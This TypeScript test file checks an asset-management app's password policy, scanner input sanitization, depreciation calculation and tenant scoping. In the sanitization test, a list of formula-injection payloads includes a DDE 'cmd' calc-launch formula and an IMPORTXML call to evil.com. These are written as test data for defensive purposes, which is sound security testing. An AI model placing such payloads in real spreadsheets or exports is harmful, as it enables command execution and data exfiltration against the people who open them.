import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { validatePasswordPolicy } from '../shared/password-policy';
import { sanitizeScanInput } from '../src/lib/sanitize';
import { calculateStraightLineDepreciation } from '../shared/finance';
import { canAccessAsset } from '../shared/permissions';
import type { UserRole } from '../src/types';

describe('Addendum 4 Hardening Verification Test Suite', () => {
  describe('Password Policy Enforcement (shared/password-policy.ts)', () => {
    it('rejects passwords under 12 characters', () => {
      const res = validatePasswordPolicy('Short1!abc');
      assert.equal(res.valid, false);
      assert.ok(res.error?.includes('at least 12 characters'));
    });

    it('rejects common or easily guessable passwords', () => {
      const commonList = [
        'password123456',
        'admin123456!',
        'omniasset123!',
        'welcome12345'
      ];
      for (const pass of commonList) {
        const res = validatePasswordPolicy(pass);
        assert.equal(res.valid, false, `Expected "${pass}" to be rejected as common`);
        assert.ok(
          res.error?.toLowerCase().includes('common'),
          `Expected common password error for "${pass}"`
        );
      }
    });

    it('rejects passwords containing user email or full name', () => {
      const resEmail = validatePasswordPolicy('Security_john.doe_2026!', {
        email: 'john.doe@company.org'
      });
      assert.equal(resEmail.valid, false);
      assert.ok(resEmail.error?.toLowerCase().includes('email'));

      const resName = validatePasswordPolicy('Corp_Alexander_2026!', {
        fullName: 'Alexander Hamilton'
      });
      assert.equal(resName.valid, false);
      assert.ok(resName.error?.toLowerCase().includes('name'));
    });

    it('rejects passwords with insufficient character variety', () => {
      const res = validatePasswordPolicy('alllowercasecharactersthatarelong');
      assert.equal(res.valid, false);
      assert.ok(res.error?.toLowerCase().includes('both letters and numbers'));
    });

    it('accepts strong compliant passwords meeting all criteria', () => {
      const strongPasswords = [
        'K9#mQ!vL2$xZ90wR',
        'Enterprise_Asset#2026$Secure',
        'Correct-Horse-Battery-Staple-99!'
      ];
      for (const pass of strongPasswords) {
        const res = validatePasswordPolicy(pass);
        assert.equal(res.valid, true, `Expected "${pass}" to be valid: ${res.error}`);
        assert.equal(res.error, undefined);
      }
    });
  });

  describe('Scanner Input Sanitization & Anti-Injection', () => {
    it('truncates inputs exceeding 256 characters', () => {
      const longInput = 'A'.repeat(500);
      const sanitized = sanitizeScanInput(longInput);
      assert.equal(sanitized.length, 256);
    });

    it('strips CSV/Formula injection trigger prefixes (=, +, -, @, tab, cr)', () => {
      const injections = [
        '=cmd|\' /C calc\'!A0',
        '+1234567890',
        '-SUM(A1:A10)',
        '@IMPORTXML("http://evil.com","//")',
        '\t\r=2+2'
      ];
      for (const raw of injections) {
        const sanitized = sanitizeScanInput(raw);
        assert.ok(!sanitized.startsWith('='), `Must not start with =: ${sanitized}`);
        assert.ok(!sanitized.startsWith('+'), `Must not start with +: ${sanitized}`);
        assert.ok(!sanitized.startsWith('-'), `Must not start with -: ${sanitized}`);
        assert.ok(!sanitized.startsWith('@'), `Must not start with @: ${sanitized}`);
        assert.ok(!sanitized.startsWith('\t'), `Must not start with tab: ${sanitized}`);
      }
    });

    it('strips ASCII control characters from scanner input', () => {
      const dirty = 'TAG-\x00\x08\x1B\x7F-12345';
      const clean = sanitizeScanInput(dirty);
      assert.equal(clean, 'TAG--12345');
    });

    it('preserves legitimate asset codes, MACs, and IMEIs', () => {
      assert.equal(sanitizeScanInput('AST-2026-0042'), 'AST-2026-0042');
      assert.equal(sanitizeScanInput('00:1A:2B:3C:4D:5E'), '00:1A:2B:3C:4D:5E');
      assert.equal(sanitizeScanInput('867530901234567'), '867530901234567');
    });
  });

  describe('Financial Depreciation Engine Parity (shared/finance.ts)', () => {
    it('calculates straight line depreciation with exact mathematical bounds', () => {
      const purchaseCost = 1000;
      const baseDate = new Date('2024-01-01');

      // Month 0: Book value equals initial purchase cost
      const yr0 = calculateStraightLineDepreciation(purchaseCost, baseDate, {
        usefulLifeMonths: 36,
        salvageFactor: 0.10,
        asOfDate: baseDate
      });
      assert.equal(yr0.bookValue, 1000);
      assert.equal(yr0.accumulatedDepreciation, 0);

      // Month 18 (half of 36 months): Depreciable base = 900, 50% = 450 depreciated
      const midDate = new Date('2025-07-01');
      const yrHalf = calculateStraightLineDepreciation(purchaseCost, baseDate, {
        usefulLifeMonths: 36,
        salvageFactor: 0.10,
        asOfDate: midDate
      });
      assert.equal(yrHalf.bookValue, 550);
      assert.equal(yrHalf.accumulatedDepreciation, 450);

      // Month 48 (past useful life): Floor at salvage value (100)
      const lateDate = new Date('2028-01-01');
      const yrBeyond = calculateStraightLineDepreciation(purchaseCost, baseDate, {
        usefulLifeMonths: 36,
        salvageFactor: 0.10,
        asOfDate: lateDate
      });
      assert.equal(yrBeyond.bookValue, 100);
      assert.equal(yrBeyond.accumulatedDepreciation, 900);
    });

    it('handles zero cost and missing purchase date gracefully', () => {
      const res = calculateStraightLineDepreciation(0, null);
      assert.equal(res.bookValue, 0);
      assert.equal(res.accumulatedDepreciation, 0);
    });
  });

  describe('Fail-Closed Tenant & Branch Scoping (shared/permissions.ts)', () => {
    const org1 = 'org-100';
    const org2 = 'org-200';
    const b1 = 'branch-1';
    const b2 = 'branch-2';

    it('strictly forbids cross-tenant asset inspection', () => {
      const user = { id: 'u1', orgId: org1, role: 'ADMIN' as UserRole };
      const foreignAsset = { id: 'a1', orgId: org2, branchId: b1, name: 'Target Server', status: 'ACTIVE' as const };
      assert.equal(canAccessAsset(user, foreignAsset), false);
    });

    it('fails closed when BRANCH_MANAGER has no branchId', () => {
      const bmNoBranch = { id: 'u-bm', orgId: org1, role: 'BRANCH_MANAGER' as UserRole, branchId: undefined };
      const asset = { id: 'a2', orgId: org1, branchId: b1, name: 'Workstation', status: 'ACTIVE' as const };
      assert.equal(canAccessAsset(bmNoBranch, asset), false);
    });

    it('allows BRANCH_MANAGER only within assigned branch', () => {
      const bm = { id: 'u-bm', orgId: org1, role: 'BRANCH_MANAGER' as UserRole, branchId: b1 };
      const asset1 = { id: 'a1', orgId: org1, branchId: b1, name: 'Asset 1', status: 'ACTIVE' as const };
      const asset2 = { id: 'a2', orgId: org1, branchId: b2, name: 'Asset 2', status: 'ACTIVE' as const };

      assert.equal(canAccessAsset(bm, asset1), true);
      assert.equal(canAccessAsset(bm, asset2), false);
    });
  });
});
